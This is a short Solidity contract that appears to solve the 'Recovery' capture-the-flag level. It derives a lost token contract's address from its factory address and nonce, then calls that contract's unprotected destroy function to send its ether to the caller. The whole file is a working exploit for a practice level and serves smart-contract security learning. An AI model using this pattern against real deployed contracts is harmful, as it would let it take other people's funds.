// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Levels/Recovery.sol";

contract RecoveryAttack {
  SimpleToken simpleToken;
  address public token;

  constructor(address _factory) {
    token = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6),bytes1(0x94), _factory, bytes1(0x01))))));
    simpleToken = SimpleToken(payable(token));
  }

  function attack() public {
    simpleToken.destroy(payable(msg.sender));
  }

}
